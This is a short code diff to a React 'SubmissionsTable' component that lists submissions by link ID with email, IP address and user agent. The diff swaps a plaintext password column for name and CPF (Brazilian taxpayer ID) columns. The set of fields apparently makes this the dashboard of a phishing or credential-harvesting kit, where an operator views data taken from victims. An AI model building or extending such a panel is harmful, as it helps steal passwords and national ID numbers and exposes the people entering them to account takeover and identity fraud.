@@ -28,7 +28,8 @@ const SubmissionsTable = () => {
             <th className="px-3 py-2">ID</th>
             <th className="px-3 py-2">Link ID</th>
             <th className="px-3 py-2">Email</th>
-            <th className="px-3 py-2">Password</th>
+            <th className="px-3 py-2">Nome</th>
+            <th className="px-3 py-2">CPF</th>
             <th className="px-3 py-2">Timestamp</th>
             <th className="px-3 py-2">IP</th>
             <th className="px-3 py-2">User Agent</th>
@@ -40,7 +41,8 @@ const SubmissionsTable = () => {
               <td className="px-3 py-2">{r.id}</td>
               <td className="px-3 py-2">{r.link_id}</td>
               <td className="px-3 py-2">{r.email}</td>
-              <td className="px-3 py-2">{r.password}</td>
+              <td className="px-3 py-2">{r.nome}</td>
+              <td className="px-3 py-2">{r.cpf}</td>
               <td className="px-3 py-2">{fmt(r.timestamp)}</td>
               <td className="px-3 py-2">{r.ip_address || "-"}</td>
               <td className="px-3 py-2 max-w-xs break-all">{r.user_agent || "-"}</td>
